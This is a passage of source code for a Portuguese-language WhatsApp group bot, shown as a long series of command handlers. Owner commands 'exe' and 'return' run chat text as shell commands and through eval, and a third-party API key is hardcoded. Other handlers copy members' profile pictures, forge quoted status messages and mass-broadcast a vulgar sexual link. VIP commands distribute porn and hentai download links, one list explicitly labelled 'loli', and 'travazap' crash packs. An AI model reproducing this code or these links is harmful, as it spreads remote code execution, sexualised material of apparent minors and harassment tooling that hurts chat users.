hay = body.slice(5)
anu = await fetchJson(`https://api.zeks.me/api/ytplaymp4?apikey=S38aL2CO2Ez4wZjJWxD2vaJKKrC&q=${hay}`)   
buffer = await getBuffer(anu.result.thumbnail)
lagu = await getBuffer(anu.result.url_video)
loli.sendMessage(from, buffer, image, {quoted: say1, caption:`${NomeDoBot} Está Baixando Seu Vídeo🎬`})
loli.sendMessage(from, lagu, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${cr}`, 'jpegThumbnail': await getBuffer(anu.result.thumbnail)}}}})
break

case 'xvideos': //@SUPRA ♡
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return  reply('sai fedido, apenas o zadik tem esse poder')
play = body.slice(8)
reply('aguarde um pouco oni-chan...')
anu = await fetchJson(`http://brizas-api.herokuapp.com/porn/xvideos?apikey=BOT SOPHIA&query=${play}`)
teks = `        *${NomeDoBot} Xvideos*\n      
Título: ${anu.titulo}
Views: ${anu.view}
Likes: ${anu.likes}
Deslikes: ${anu.deslikes}
Canal: ${anu.canal}
link: ${anu.link}
Zadik lindo!`
buffer = await getBuffer(anu.thumb)
loli.sendMessage(from, buffer, image, {quoted: say, caption: teks})
break

case 'leaderboard':
case 'lb':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))


try {
for (let i = 0; i < 10; i++) {
nom++
leaderboardlvl += `[${nom}] @${userh[i].id.replace('@s.whatsapp.net', '')}\n┗⊱XP: ${userh[i].xp} Level: ${userh[i].level}\n┗⊱Patente: ${patt}\n`            
   
 }
loli.sendMessage(from, leaderboardlvl, text, {quoted: mek})
} catch (err) {
console.error(err)
await reply(`pelo menos 10 usuários para poder acessar o banco de dados`)
}
break

case 'ranklevel':
case 'rl':
_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
let userh = _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
let leaderboardlvl = '    🏆《 Rank Niveis 》🏆\n\n'
let nom = 0
try {
for (let i = 0; i < 10; i++) {
nom++
leaderboardlvl += `
┏ ✘🌖 ${groupName}🌘✘┓
┃•────•───────•───•
┣❲🏆❳ [${nom}] ϟ➠ ${nom}] @${userh[i].id.replace('@s.whatsapp.net', '')}
┣❲🏆❳「xp」: ϟ➠${_level[i].xp}
┣❲🏆❳「Level」 :ϟ➠ ${_level[i].level}       
┗ ──────「★」──────┚\n`

}
leaderboardlvl += `×•-•-•⟮ 🏆Ranking Level🏆⟯•-•-•×`
loli.sendMessage(from, leaderboardlvl, text, {sendEphemeral: true, quoted: say1})
} catch (err) {
console.error(err)
await reply(`10 Pessoas No grupo!`)
}
break



case 'm18': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(ptbr.nsfw())
costum(m18(pushname, prefix), text, tescuk, crh)
break


case 'roubar':
case 'rename':
if (!isQuotedSticker) return reply('Apenas figurinha mano')
var encmediats = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var pack = `𝗛𝗼𝗿𝗶-𝗕𝗢𝗧`
var author = `${pushname}`
var dlfile = await loli.downloadMediaMessage(encmediats)
reply(mess.wait)
var bas64 = `data:image/jpeg;base64,${dlfile.toString('base64')}`
var mantap = await convertSticker(bas64, `${author}`, `${pack}`)
var imageBuffer = new Buffer.from(mantap, 'base64');
replyS(imageBuffer)
break

/* ===================================================[ ${NomeDoMenu} ]==============================================================*/    

case 'dono':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return  reply(ptbr.ownerB())
const chatts = `${totalchat.length}`
const dono1 = fs.readFileSync('./src/dono.mp4')
const dinheiro1 = checkATMuser(sender)
loli.sendMessage(from, dono1,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `

╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│Olá @${sender.split('@')[0]}!!
┃⋆├───────────────────
┃⋆│⬩ 𝚒𝚗𝚏𝚘𝚛𝚖𝚊𝚌̧𝚘̃𝚎𝚜 𝚍𝚘 𝚋𝚘𝚝
┃⋆│⪧ Nome ${pushname} ⟨💎⟩
┃⋆│⪧ prefix: ⟨ ${prefix} ⟩ ⟨❗⟩            
┃⋆│⪧ Bateria: ${bateria} ⟨🔋⟩               
┃⋆│⪧ Horário: ${hr} ⟨⏰⟩                       
┃⋆│⪧ Chats ${chatts} ⟨🏓⟩
┃⋆╰───────────────────
╰━════════════════════⊷
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ 𝙼𝚎𝚗𝚞 𝚍𝚘 𝚍𝚘𝚗𝚘
┃⋆│💎➢ ${prefix}Clone ⦗🔥⦘
┃⋆│➥ Copia a foto de perfil do alvo
┃⋆│💎➢ ${prefix}Antiflod ⦗🔥⦘
┃⋆│➥ Antispam de comandos
┃⋆│💎➢ ${prefix}modonsfw ⦗🔥⦘
┃⋆│➥ Comandos de hentai
┃⋆│💎➢ ${prefix}Block ⦗☔⦘
┃⋆│➥ Bloqueia o alvo
┃⋆│💎➢ ${prefix}Unblock ⦗💎⦘
┃⋆│➥ Remove o block do alvo
┃⋆│💎➢ ${prefix}Banpp ⦗💖⦘
┃⋆│➥ Adicionar na lista de banidos
┃⋆│💎➢ ${prefix}Unban ⦗👨🏽‍✈️⦘
┃⋆│➥ Remove da lista de banidos
┃⋆│💎➢ ${prefix}Addvip ⦗🐤⦘
┃⋆│➥ Adciona na lista vip
┃⋆│💎➢ ${prefix}Dellvip ⦗👾⦘
┃⋆│➥ Tira vip do usuário
┃⋆│💎➢ ${prefix}Readallchat ⦗🤝🏼⦘
┃⋆│➥ Visualizar todas as mensagens
┃⋆│💎➢ ${prefix}Kill2 ⦗🌀⦘
┃⋆│➥ Desligar o bot em pm2
┃⋆│💎➢ ${prefix}status ⦗💻⦘
┃⋆│➥ ver informação do servidor do bot
┃⋆│💎➢ ${prefix}statusbot ⦗💻⦘
┃⋆│➥ ver informação do servidor do bot
┃⋆│💎➢ ${prefix}katana ⦗👹⦘
┃⋆│➥ matar ghost do grupo
┃⋆│💎➢ ${prefix}bc ⦗👾⦘
┃⋆│➥ manda mensagem para geral
┃⋆│💎➢ ${prefix}bcimg ⦗👾⦘
┃⋆│➥ manda imagem para geral
⋆│💎➢ ${prefix}bcsticker ⦗👾⦘
┃⋆│➥ manda sticker para geral
┃⋆│💎➢ ${prefix}Shutdown ⦗🌀⦘
┃⋆│➥ Desligar o bot em node
┃⋆│💎➢ ${prefix}Desligar ⦗💮⦘
┃⋆│➥ Desligar o bot sem pm2
┃⋆│💎➢ ${prefix}Exe ⦗🥵⦘
┃⋆│➥ Usar comandos no terminal
┃⋆│💎➢ ${prefix}Clearchat ⦗😎⦘
┃⋆│➥ Apaga todos os chats
┃⋆│💎➢ ${prefix}Listgrup ⦗💘⦘
┃⋆│➥ Listar todos os grupos
┃⋆│💎➢ ${prefix}Privado ⦗🌸⦘
┃⋆│➥ O bot fica privado, pra ngm usar
┃⋆│💎➢ ${prefix}Publico ⦗🐷⦘
┃⋆│➥ O bot fica em público
┃⋆│💎➢ ${prefix}Upswimg ⦗🐦⦘
┃⋆│➥ Posta uma imagem nos status
┃⋆│💎➢ ${prefix}Upswvideo ⦗💖⦘
┃⋆│➥ Posta uma video nos status
┃⋆│💎➢ ${prefix}Upswtext ⦗🎗️⦘
┃⋆│➥ Posta uma texto nos status
┃⋆╰───────────────────
╰━════════════════════⊷`})
break
case 'bc':
addFilter(from)
loli.updatePresence(from, Presence.composing)
if (!isOwner) return  reply('sai fedido, apenas o zadik tem esse poder')
if (args.length < 1) return enviar('Cadê o texto?')
tobis = await loli.chats.all()
for (let _ of tobis) {
loli.sendMessage(_.jid, `${q}`, text, {contextInfo :{text: 'hi', "forwardingScore": 1000000000, isForwarded: true, sendEphemeral: true, "externalAdReply": {"title": `𝓣𝓡𝓐𝓝𝓢𝓜𝓘𝓒̧𝓐̃𝓞 𝓓𝓞 𝓒𝓡𝓘𝓐𝓓𝓞𝓡`, "body": "", "previewType": "PHOTO", "thumbnailUrl": "https://ibb.co/RQz34Hh", "thumbnail": img2, "sourceUrl": "https://api.whatsapp.com/send?phone=5521971702453&text=zadik,come%20minha%20bucetinha??%F0%9F%A5%B5%F0%9F%A5%B5"}}})
}
reply('Transmissão enviada com sucesso')
break
case 'clone': //Dono
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return  reply(ptbr.ownerB())
if (args.length < 1) return reply('Mencione quem devo roubar a foto de perfil')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
try {
pp = await loli.getProfilePicture(id)
buffer = await getBuffer(pp)
loli.updateProfilePicture(botNumber, buffer)
mentions(`Roubei a foto de perfil de: @${id.split('@')[0]}`, [jid], true)
} catch (e) {
reply('ocorreu um erro')
}
break

case 'block': //Dono
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return reply(ptbr.ownerB())
loli.blockUser (`${body.slice(8)}@c.us`, "add")
loli.sendMessage(from, `Número de bloqueio, pedido recebido`, text, {
quoted: say1
})
break

case 'unblock': //Dono
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return reply(ptbr.ownerB())
loli.blockUser (`${body.slice(9)}@c.us`, "remove")
loli.sendMessage(from, `Desbloquear, comando aceito`, text)
break

case 'banpp': //Dono
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return  reply(ptbr.ownerB())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.push(`${mentioned}`)
fs.writeFileSync('./datauser/banned.json', JSON.stringify(ban))
susp = `🚫@${mentioned[0].split('@')[0]} foi banido e não poderá mais usar os comandos do bot🚫`
mentions(`${susp}`, mentioned, true)   
break

case 'unban': //Dono
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return  reply(ptbr.ownerB())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.splice(`${mentioned}`)
fs.writeFileSync('./datauser/banned.json', JSON.stringify(ban))
susp = `❎@${mentioned[0].split('@')[0]} foi desbanido e poderá novamente usar os comandos do bot❎`
mentions(`${susp}`, mentioned, true)   
break

case 'addvip': //Dono
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return  reply(ptbr.ownerB())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
vipp.push(`${mentioned}`)
fs.writeFileSync('./database/vip.json', JSON.stringify(vipp))
susp = `👑@${mentioned[0].split('@')[0]} foi adicionado à lista de usuários vip com sucesso👑`
mentions(`${susp}`, mentioned, true)   
break

case 'dellvip': //Dono
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return  reply(ptbr.ownerB())
if (mek.message.extendedTextMessage === undefined
|mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
vipp.splice(`${mentioned}`)
fs.writeFileSync('./database/vip.json', JSON.stringify(vipp))
susp = `✖@${mentioned[0].split('@')[0]} foi removido da lista de usuários vip✖`
mentions(`${susp}`, mentioned, true)   
break

case 'readallchat':
case 'readall':
case 'rall':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const readallid = await loli.chats.all()
loli.setMaxListeners(25)
for (let xyz of readallid) {
await loli.chatRead(xyz.jid)
}
loli.sendMessage(from, `Pronto`, text, {
quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(from ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"imageMessage": {
"mimetype": "image/jpeg",
"caption": "Todos os chats foram vistos",
'jpegThumbnail': fs.readFileSync('./database/help/bot.jpg')
}
}
}
})
break

case 'kill2':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return  reply(ptbr.ownerB())
pm2 = `pm2 kill`
reply('A mimir...')
exec(pm2, (err, stdout) => {
if (err) return loli.sendMessage(from, "Erro", text, {
quoted: say1
})
if (stdout) {
loli.sendMessage(from, stdout, text, {
quoted: say1
})
}
})
break

case 'desligar-node':
case 'shutdown':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return  reply(ptbr.ownerB())
reply('Desligando em 3 segundos....')
setTimeout(() => {
loli.close()
}, 3000)
break

case 'desligar':
case 'desliga':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return reply(ptbr.ownerB)
reply('Desligando em 3 segundos....')
setTimeout(() => {
loli.close()
}, 3000)
break

case 'exe': //Dono
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname)) 
if (!isOwner) return  reply(ptbr.ownerB())
const cmd = body.slice(4)
var itsme = `0@s.whatsapp.net`
var split = `EXECUTOR`
const term = {
contextInfo: {
participant: itsme,
quotedMessage: {
extendedTextMessage: {
text: split,
}
}
}
}
exec(cmd, (err, stdout) => {
if (err) return loli.sendMessage(from, `EXEC ${err}`, text, {
quoted: say1
})
if (stdout) {
loli.sendMessage(from, stdout, text, term)
}
})
break

case 'return':
if (!isOwner) return reply(ptbr.owner)
arguss = body.slice(8)
return loli.sendMessage(from, JSON.stringify(eval(arguss)), text, {
quoted: mek
})
break

case 'clearchat':
case 'clearall':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return  reply(ptbr.ownerB())
anu = await loli.chats.all()
list_chat = await loli.chats.all()
for (let chat of list_chat) {
loli.modifyChat(chat.jid, "delete", {includeStarred: false})
}
reply("Chat limpo")
break

case 'getgrup': 
case 'getgroup': 
case 'getg':
case 'gruplist':
case 'listgrup':
case 'grouplist':
case 'listgroup':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
ingfo = await getGroup(totalchat)
let txt = `*Lista dos grupos*\nNúmero de Grupos: ${ingfo.length}\n\n`
for (let i = 0; i < ingfo.length; i++){
txt += `Nome do grupo : ${ingfo[i].subject}\nID : ${ingfo[i].id}\nFeito : ${moment(`${ingfo[i].creation}` * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss')}\nNúmero de participantes : ${ingfo[i].participants.length}\n\n`
}
reply(txt)
break

case 'public':
case 'publico':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
 if (!isOwner) return
if (banChats === false) return
uptime1 = process.uptime1()
anu  = {contextInfo:{'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"imageMessage": {"caption": `「 publico 」\n*${runtime(process.uptime())}*`, 'jpegThumbnail': fs.readFileSync('./lib/logo.jpeg')}}}}
banChats = false
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m PUBLICO \x1b[1;37m]', color('O modo publico foi ativado agora todos pode usar os cmd do bot', 'yellow'))
loli.sendMessage(from, `「 *MODO-PUBLICO* 」`, text,anu)
break

case 'self':
case 'privado':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return
if (banChats === true) return
uptime = process.uptime()
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m PRIVADO \x1b[1;37m]', color('Modo privado foi ativado agora so você pode usar os cmd', 'yellow'))
anu  = {contextInfo:{'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"imageMessage": {"caption": `「 privado 」\n*${runtime(process.uptime())}*`, 'jpegThumbnail': fs.readFileSync('./lib/logo.jpeg')}}}}
banChats = true
loli.sendMessage(from, `「 *MODO-PRIVADO* 」`, text,anu)
break

case 'upswimg': //Dono
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return  reply(ptbr.ownerB())
loli.updatePresence(from, Presence.composing)
if (isQuotedImage) {
const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
cihcih = await loli.downloadMediaMessage(swsw)
loli.sendMessage('status@broadcast', cihcih, image, {
caption: `${q}`
})
}
if (args.length < 1) {
bur = `Imagem enviada ao status`
loli.sendMessage(from, bur, text, {
quoted: say1
})
} else {
bur = `Imagem enviada ao status com a legenda: ${q}`
loli.sendMessage(from, bur, text, {
quoted: say1
})
}
break

case 'upswvideo': //Dono
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return  reply(ptbr.ownerB())
loli.updatePresence(from, Presence.composing)
if (isQuotedVideo) {
const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
cihcih = await loli.downloadMediaMessage(swsw)
loli.sendMessage('status@broadcast', cihcih, video, {
caption: `${q}`
})
}
if (args.length < 1) {
bur = `Vídeo enviado ao status`
loli.sendMessage(from, bur, text, {
quoted: say1
})
} else {
bur = `Vídeo enviado ao status com a legenda: ${q}`
loli.sendMessage(from, bur, text, {
quoted: say1
})
}
break

case 'upswtext':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return  reply(ptbr.ownerB())
loli.updatePresence(from, Presence.composing)
loli.sendMessage('status@broadcast', `${q}`, extendedText)
loli.sendMessage(from, `Texto enviado ao status: ${q}`, text, {
quoted: say1
})
break

case 'fotos': case 'down': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (m.isGroup) return reply(`Você so pode resgatar no privado do bot mas tem que ter o vip *.buyvip*`)
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
const fotos = {
text:
 `
LISTA DE UTILITÁRIOS

PACK DE FOTOS PARA EDITAR > TRAVAZAP
https://www.mediafire.com/file/2zghw4ln220duma/PACK_DE_FOTOS_TRAVA_ZAP.zip/file

Pack de Wallpapers 
https://encurta.eu/2QJmIsY

EXCLUSIVO Pack de fotos pra fazer plaquinha
https://www.mediafire.com/file/ofsfhtla8atrpmo/pack_plaquinha_%252B18_BY_sombrio.zip/file

Pack de edição basico completinho
https://www.mediafire.com/file/uu05t78t4er55og/PACK+EFEITOS+BY+@SHL+TV%E2%9A%A0%EF%B8%8F%E2%9C%85.zip/file

Pack de fontes bonitas
https://www.mediafire.com/file/bgv8liojstii9qx/PACK_FONTES_ATUALIZADA_START_DZN.zip/file

Pack para edições quase 1 gb
https://www.mediafire.com/file/lae02ex8t23vyfc/MEGA_PACK_STARTDZN_20K.zip/file

Pack de fotos pra perfil de anime
https://www.mediafire.com/file/9q0ty4o7sp25bci/Fotos_de_Animes.zip/file

Pack de fotos travazap
https://mega.nz/file/upIg0bAY#8ewyRoSyKhapjvPc1csBeucPttHCMcwVczEff-5FvLo

Pack de bases travzap edit
https://www.mediafire.com/file/vw79er089dlld4h/by_%25CE%25A9_HypezinMaker.7z/file

Pack wallpaper's dark
https://www.mediafire.com/file/enssb4y6lqtn45u/%25F0%259D%2590%258F%25F0%259D%2590%259A%25F0%259D%2590%259C%25F0%259D%2590%25A4_%25F0%259D%2590%2583%25F0%259D%2590%259E_%25F0%259D%2590%2585%25F0%259D%2590%25A8%25F0%259D%2590%25AD%25F0%259D%2590%25A8%25F0%259D%2590%25AC_-_%25F0%259D%2590%2592%25F0%259D%2590%2587%25F0%259D%2590%2580%25F0%259D%2590%2583%25F0%259D%2590%2584%25F0%259D%2590%2597%25F0%259D%2590%2597.zip/file

${SeuNome} domina vadias👑
CASO QUEIRA QUE ALGUM LINK APAREÇA NESSA LISTA MANDE O LINK DE DOWNLOAD PRO CRIADOR
`,
contextInfo: {mentionedJid: [sender]}}
loli.sendMessage(from, fotos, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `${cr}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./database/help/bot.jpg')}}}})
break

case 'packs':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (m.isGroup) return reply(`Você so pode resgatar no privado do bot mas tem que ter o vip *.buyvip*`)
const packs = {
text:
 `
*PACKS:*
    
*${SeuNome} ⭐Henplay Oficial®⭐*
⚠️ALGUNS LINK ESTÃO COM ENCUTADOR ⚠️

Belle delphine : https://photos.app.goo.gl/Jr4Qk1dFSJepPdRc7 

Pack1: https://photos.app.goo.gl/phyRpNFLcAtsknfJ7

Pack Hentai:  
-
https://www.mediafire.com/file/iv350tv2tle285o/Novo_super_pack_3.000_fotos_ecchi_%25C3%2589_hentai.zip/file
-
http://www.mediafire.com/file/jh39pqn67hywrcz/fotos_hentai_animakeep.rar/file
-
http://www.mediafire.com/file/fcvbk9zbcjccylo/Pack_de_imagenes_hentai_%232.rar/file
-
http://www.mediafire.com/file/19i5d52ql4yayql/Pack_de_imagenes_hentai_%234.rar/file
-
http://www.mediafire.com/file/7ag5wax666stq64/Pack_de_imagenes_hentai_%233.rar/file
-
http://www.mediafire.com/file/xilyebi9m81jokk/Pack_de_imagenes_hentai_%231.rar/file
-
http://www.mediafire.com/file/5wqwk63ogilux5m/Pack_de_gif.rar/file
-
http://www.mediafire.com/file/py58lrsrin0wkpm/SSSS-PACK_%25281%2529.rar/file
-
http://www.mediafire.com/file/nvs5nabzhsqimdg/SSSS-PACK_%25282%2529.rar/file
-
http://www.mediafire.com/file/ok8m0astg1pabb4/SSSS-PACK_%25283%2529.rar/file
-
http://www.mediafire.com/file/gijdhbndggvy8x1/SSSS-PACK_%25284%2529.rar/file
-
http://www.mediafire.com/file/27m53e9uc0wdi65/SSSS-PACK_%25285%2529.rar/file
-
http://www.mediafire.com/file/on2ceku3ccj3igx/SSSS-PACK_%25286%2529.rar/file
-
http://www.mediafire.com/file/cic3qdyb54q3jl5/SSSS-PACK_%25287%2529.rar/file
-
http://www.mediafire.com/file/0l2rijn2hcyoybd/SSSS-PACK_%25288%2529.rar/file
-
http://www.mediafire.com/file/1f1173jwh6s42de/SSSS-PACK_%25289%2529.rar/file
-
http://www.mediafire.com/file/t51b599qqpp0mk7/SSSS-PACK_%252810%2529.rar/file
-
http://www.mediafire.com/file/n4aon869lq419bq/%255BPack%255D_Isekai_Maou_To_Shoukan_Shoujo_No_Dorei_Majutsu.rar/file

Kitty kum: https://photos.app.goo.gl/gNxLbJHGVzeWY9iS9 

Misaki Your Waifu: https://photos.app.goo.gl/M9nyHdonAJu5GRjZ9 

pack: https://photos.app.goo.gl/SrogbCbnanL2PJQn7 

Love Lilah : https://photos.app.goo.gl/TBbkjGGdAVHjPFt5A 

https://photos.app.goo.gl/Jr4Qk1dFSJepPdRc7
-
https://photos.app.goo.gl/gNxLbJHGVzeWY9iS9
-
https://photos.app.goo.gl/TBbkjGGdAVHjPFt5A
-
https://photos.app.goo.gl/phyRpNFLcAtsknfJ7
-
https://photos.app.goo.gl/g685WWL4T7BcZssk8
-
https://photos.app.goo.gl/Tqvfv8yVdp3FaUnX9
-
https://mega.nz/folder/aU1wVTZR#6_P4jZGjUZmHqC5Fu2Y78Q
-
https://suaurl.com/b995e2
-
https://suaurl.com/55eb2f
-
https://suaurl.com/8c135b
-
https://suaurl.com/5e91e0
-
https://suaurl.com/5c699d
-
https://suaurl.com/dbaae7
-
https://suaurl.com/f43f76

https://photos.app.goo.gl/Jr4Qk1dFSJepPdRc7
-
https://photos.app.goo.gl/gNxLbJHGVzeWY9iS9
-
https://photos.app.goo.gl/TBbkjGGdAVHjPFt5A
-
https://photos.app.goo.gl/phyRpNFLcAtsknfJ7
-
https://photos.app.goo.gl/g685WWL4T7BcZssk8
-
https://photos.app.goo.gl/Tqvfv8yVdp3FaUnX9
-
https://mega.nz/folder/aU1wVTZR#6_P4jZGjUZmHqC5Fu2Y78Q
-
https://suaurl.com/b995e2
-
https://suaurl.com/55eb2f
-
https://suaurl.com/8c135b
-
https://suaurl.com/5e91e0
-
https://suaurl.com/5c699d
-
https://suaurl.com/dbaae7
-
https://suaurl.com/f43f76
`,
contextInfo: {mentionedJid: [sender]}}
loli.sendMessage(from, packs, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `${cr}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./database/help/bot.jpg')}}}})
break

case 'nhentaicod':
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (m.isGroup) return reply(`Você so pode resgatar no privado do bot mas tem que ter o vip *.buyvip*`)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
textmenu = ` 
*ola👋👋* *COLETE SEUS CÓDIGOS DE HENTAI 😌*
Código Nuclear [Doujin Hentai gênero NTR] (Netorare)
Modo Gampang :
• https://nhentai.net/g/316755/
• https://nhentai.net/g/316596/
• https://nhentai.net/g/311850/
• https://nhentai.net/g/315578/
• https://nhentai.net/g/315488/
• https://nhentai.net/g/315406/
• https://nhentai.net/g/315344/
• https://nhentai.net/g/315323/
• https://nhentai.net/g/315136/
• https://nhentai.net/g/315099/
Modo Médio :
• https://nhentai.net/g/316867/
• https://nhentai.net/g/316869/
• https://nhentai.net/g/316785/
• https://nhentai.net/g/316763/51/
• https://nhentai.net/g/316445/
• https://nhentai.net/g/316250/
• https://nhentai.net/g/311283/
• https://nhentai.net/g/265671/
• https://nhentai.net/g/312127/
• https://nhentai.net/g/311560/
Modo difícil :
• https://nhentai.net/g/316820/
• https://nhentai.net/g/316481/
• https://nhentai.net/g/316430/
• https://nhentai.net/g/276347/
• https://nhentai.net/g/196329/
• https://nhentai.net/g/304543/
• https://nhentai.net/g/295295/
• https://nhentai.net/g/311262/
• https://nhentai.net/g/311882/
• https://nhentai.net/g/312180/
Código nuclear de MILF Oneesan até mano ***** loli
https://nhentai.net/g/271890/
https://nhentai.net/g/272057/
https://nhentai.net/g/272173/
https://nhentai.net/g/272182/
https://nhentai.net/g/272196/
ht
https://nhentai.net/g/272512/
https://nhentai.net/g/271245/
https://nhentai.net/g/271056/
https://nhentai.net/g/270809/
https://nhentai.net/g/269653/
https://nhentai.net/g/266088/
https://nhentai.net/g/264980/
https://nhentai.net/g/262215/
https://nhentai.net/g/260433/
-
https://nhentai.net/g/260146/
https://nhentai.net/g/256738/
https://nhentai.net/g/272425/
https://nhentai.net/g/272352/
https://nhentai.net/g/272045/
https://nhentai.net/g/272015/
https://nhentai.net/g/271993/
https://nhentai.net/g/271924/
https://nhentai.net/g/271905/
https://nhentai.net/g/271797/
-
https://nhentai.net/g/271760/
https://nhentai.net/g/271717/
